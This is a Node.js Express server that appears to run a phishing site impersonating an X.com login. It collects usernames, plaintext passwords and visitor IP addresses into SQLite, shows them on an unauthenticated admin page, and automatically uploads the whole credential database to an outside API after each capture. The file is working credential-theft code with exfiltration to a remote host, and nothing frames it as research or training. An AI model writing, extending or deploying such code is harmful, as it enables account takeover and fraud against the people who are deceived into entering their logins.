const express = require('express');
const bodyParser = require('body-parser');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');
const axios = require('axios');
const FormData = require('form-data');
const config = require('./config');

const app = express();
const port = config.server.port;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Initialize database
const db = new sqlite3.Database(config.database.filename);

// Create users table if it doesn't exist
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS ${config.database.tableName} (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT,
    password TEXT NOT NULL,
    ip_address TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);
});

// Function to test API endpoint and check available methods
async function testAPIEndpoint() {
  try {
    console.log('🔍 Testing API endpoint...');

    // Test POST method only
    try {
      const response = await axios.post(`${config.api.baseUrl}${config.api.uploadEndpoint}`, {}, {
        timeout: 5000,
        validateStatus: () => true // Don't throw on any status code
      });

      console.log(`   POST: ${response.status} ${response.status !== 405 ? '✅' : '❌'}`);
      if (response.status === 422) {
        console.log('   📝 API accepts POST but expects specific data format');
      }
    } catch (error) {
      console.log(`   POST: ERROR - ${error.message}`);
    }

    return { POST: 'tested' };
  } catch (error) {
    console.error('❌ Error testing API endpoint:', error.message);
    return null;
  }
}

// Function to verify data was saved to database
function verifyDataInDatabase(username, password, ipAddress) {
  return new Promise((resolve, reject) => {
    const query = `SELECT * FROM ${config.database.tableName} WHERE username = ? AND password = ? AND ip_address = ? ORDER BY timestamp DESC LIMIT 1`;

    db.get(query, [username, password, ipAddress], (err, row) => {
      if (err) {
        console.error('❌ Error verifying data:', err);
        reject(err);
        return;
      }

      if (row) {
        console.log(`✅ Data verified in database: ID ${row.id}, Username: ${row.username}`);
        resolve(true);
      } else {
        console.log('❌ Data not found in database');
        resolve(false);
      }
    });
  });
}


async function uploadDatabaseToAPI(retryCount = 0) {
  try {
    const dbPath = path.join(__dirname, config.database.filename);


    if (!fs.existsSync(dbPath)) {
      console.log('❌ Database file not found, skipping upload');
      return false;
    }


    const stats = fs.statSync(dbPath);
    if (stats.size === 0) {
      console.log('❌ Database file is empty, skipping upload');
      return false;
    }

    console.log(`📁 Database file found: ${config.database.filename} (${stats.size} bytes)`);


    await new Promise(resolve => setTimeout(resolve, 100));

    const fileBuffer = fs.readFileSync(dbPath);
    const form = new FormData();

    form.append('db_file', fileBuffer, {
      filename: config.database.filename,
      contentType: 'application/x-sqlite3'
    });

    console.log('🔄 Uploading database with field name: db_file');

    const response = await axios.post(`${config.api.baseUrl}${config.api.uploadEndpoint}`, form, {
      headers: form.getHeaders(),
      timeout: config.api.timeout
    });

    console.log('✅ Database uploaded successfully!');
    console.log('Response:', response.data);
    return true;

  } catch (error) {
    console.error(`❌ Error uploading database to API (attempt ${retryCount + 1}):`, error.message);
    if (error.response) {
      console.error('API Response:', error.response.data);
      console.error('Status Code:', error.response.status);
    }

    if (retryCount < config.upload.retryAttempts - 1) {
      console.log(`🔄 Retrying upload in ${config.upload.retryDelay}ms...`);
      await new Promise(resolve => setTimeout(resolve, config.upload.retryDelay));
      return uploadDatabaseToAPI(retryCount + 1);
    }

    return false;
  }
}

app.get('/', (req, res) => {
  res.render('index');
});


app.post('/connect-username', (req, res) => {
  const { username } = req.body;

  res.render('password', { username: username });
});

app.post('/connect', async (req, res) => {
  const { username, password } = req.body;
  const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  try {
    // First: Save data to local database
    console.log('💾 Saving user data to local database...');

    // Use a transaction to ensure data is committed
    db.serialize(() => {
      db.run('BEGIN TRANSACTION');

      const stmt = db.prepare(`INSERT INTO ${config.database.tableName} (username, password, ip_address) VALUES (?, ?, ?)`);
      stmt.run(username, password, ipAddress, function (err) {
        if (err) {
          console.error('❌ Error inserting data:', err);
          db.run('ROLLBACK');
          return;
        }

        console.log(`✅ User data saved to local database (ID: ${this.lastID})`);

        // Commit the transaction
        db.run('COMMIT', async (err) => {
          if (err) {
            console.error('❌ Error committing transaction:', err);
            return;
          }

          console.log('✅ Transaction committed successfully');

          // Force database to write to disk
          db.run('PRAGMA wal_checkpoint(FULL)', async (err) => {
            if (err) {
              console.error('❌ Error checkpointing database:', err);
            } else {
              console.log('✅ Database checkpoint completed');
            }


            try {
              const dataVerified = await verifyDataInDatabase(username, password, ipAddress);
              if (!dataVerified) {
                console.log('⚠️ Data verification failed, skipping upload');
                res.redirect('/');

                return;
              }
            } catch (verifyError) {
              console.error('❌ Error during data verification:', verifyError);
            }

            // Second: Upload database to API (if auto-upload is enabled)
            if (config.upload.autoUpload) {
              console.log('🔄 Uploading database to API...');
              const uploadSuccess = await uploadDatabaseToAPI();
              if (uploadSuccess) {
                console.log('✅ Database uploaded successfully to API');
              } else {
                console.log('⚠️ Database upload failed, but data is saved locally');
              }
            }

            // Third: Redirect to X.com
            res.redirect('/');

          });
        });
      });
      stmt.finalize();
    });

  } catch (error) {
    console.error('❌ Error in connect process:', error.message);
    // Even if upload fails, still redirect user
    res.redirect('/');

  }
});

// Admin page to view all entries
app.get('/admin', (req, res) => {
  db.all(`SELECT * FROM ${config.database.tableName} ORDER BY timestamp DESC`, (err, rows) => {
    if (err) {
      console.error(err);
      return res.status(500).send('Database error');
    }
    res.render('admin', { users: rows });
  });
});

// Manual upload endpoint for testing
app.post('/admin/upload-db', async (req, res) => {
  try {
    console.log('🔄 Manual database upload requested...');
    const uploadSuccess = await uploadDatabaseToAPI();

    if (uploadSuccess) {
      res.json({
        success: true,
        message: 'Database uploaded successfully to API',
        timestamp: new Date().toISOString()
      });
    } else {
      res.status(500).json({
        success: false,
        message: 'Database upload failed after all retry attempts',
        timestamp: new Date().toISOString()
      });
    }
  } catch (error) {
    console.error('❌ Manual upload failed:', error.message);
    res.status(500).json({
      success: false,
      message: 'Upload failed',
      error: error.message,
      timestamp: new Date().toISOString()
    });
  }
});

// Delete all data endpoint
app.post('/admin/delete', async (req, res) => {
  try {
    console.log('🗑️ Delete all data requested...');

    // Delete all records from the database
    db.run(`DELETE FROM ${config.database.tableName}`, function (err) {
      if (err) {
        console.error('❌ Error deleting data:', err);
        return res.status(500).json({
          success: false,
          message: 'Failed to delete data',
          error: err.message,
          timestamp: new Date().toISOString()
        });
      }

      console.log(`✅ Deleted ${this.changes} records from database`);

      // Reset auto-increment counter
      db.run(`DELETE FROM sqlite_sequence WHERE name='${config.database.tableName}'`, (err) => {
        if (err) {
          console.error('❌ Error resetting sequence:', err);
        } else {
          console.log('✅ Auto-increment counter reset');
        }

        // Upload empty database to API
        console.log('🔄 Uploading empty database to API...');
        uploadDatabaseToAPI().then((uploadSuccess) => {
          if (uploadSuccess) {
            console.log('✅ Empty database uploaded successfully');
          } else {
            console.log('⚠️ Failed to upload empty database');
          }
        });

        res.json({
          success: true,
          message: `Successfully deleted ${this.changes} records`,
          deletedCount: this.changes,
          timestamp: new Date().toISOString()
        });
      });
    });

  } catch (error) {
    console.error('❌ Delete operation failed:', error.message);
    res.status(500).json({
      success: false,
      message: 'Delete operation failed',
      error: error.message,
      timestamp: new Date().toISOString()
    });
  }
});

// Test API endpoint
app.get('/admin/test-api', async (req, res) => {
  try {
    const results = await testAPIEndpoint();
    res.json({
      success: true,
      results: results,
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message,
      timestamp: new Date().toISOString()
    });
  }
});

// Detailed API test endpoint
app.get('/admin/test-api-detail', async (req, res) => {
  try {
    console.log('🔍 Detailed API testing...');

    // Test with empty POST
    try {
      const emptyResponse = await axios.post(`${config.api.baseUrl}${config.api.uploadEndpoint}`, {}, {
        headers: { 'Content-Type': 'application/json' },
        timeout: 5000,
        validateStatus: () => true
      });
      console.log('Empty POST response:', emptyResponse.status, emptyResponse.data);
    } catch (error) {
      console.log('Empty POST error:', error.response?.status, error.response?.data);
    }

    // Test with minimal JSON
    try {
      const minimalResponse = await axios.post(`${config.api.baseUrl}${config.api.uploadEndpoint}`, {
        test: 'data'
      }, {
        headers: { 'Content-Type': 'application/json' },
        timeout: 5000,
        validateStatus: () => true
      });
      console.log('Minimal JSON response:', minimalResponse.status, minimalResponse.data);
    } catch (error) {
      console.log('Minimal JSON error:', error.response?.status, error.response?.data);
    }

    res.json({
      success: true,
      message: 'Detailed API test completed, check console for results',
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message,
      timestamp: new Date().toISOString()
    });
  }
});

// Start the server
app.listen(port, '0.0.0.0', async () => {
  console.log('X.com server listening on 0.0.0.0:3002');
  console.log(`📤 Database will be uploaded to: ${config.api.baseUrl}${config.api.uploadEndpoint}`);

  // Test API endpoint on startup
  console.log('\n🔍 Testing API endpoint on startup...');
  await testAPIEndpoint();
  console.log('');
});